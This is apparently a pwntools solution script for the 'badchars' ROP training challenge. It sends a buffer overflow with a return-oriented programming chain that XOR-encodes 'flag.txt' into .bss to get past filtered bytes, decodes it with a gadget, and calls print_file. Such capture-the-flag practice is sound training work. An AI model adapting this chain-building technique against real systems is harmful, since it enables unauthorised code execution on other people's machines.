#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./badchars')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./badchars', gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process('./badchars')
r = start()
#========= exploit here ===================
movr13r12 = 0x0000000000400634
bss = 0x0000000000601038
popr12r13r14r15 = 0x000000000040069c
popr14r15 = 0x00000000004006a0
poprdi = 0x00000000004006a3
xorGadget =  0x0000000000400628
print_file = 0x400510

new_flag = []
for i in b"flag.txt":
    new_flag.append(xor(i,0x2))
new_flag = b"".join(new_flag)

def shellcodexor(i):
    payload = p64(popr14r15)
    payload += p64(0x2)
    payload += p64(bss+i)
    payload += p64(xorGadget)
    return payload

payload = [
        b"A"*40,
        p64(popr12r13r14r15),
        new_flag, #r12
        p64(bss),#r13
        p64(0xdeadbeef),#r14
        p64(0xdeadbeef),#r15
        p64(movr13r12),
        ]
for i in range(len(new_flag)):
    payload.append(shellcodexor(i))
        
payload.append(p64(poprdi))
payload.append(p64(bss))
payload.append(p64(print_file))
payload = b"".join(payload)


r.sendlineafter(">",payload)
#========= interactive ====================
r.interactive()
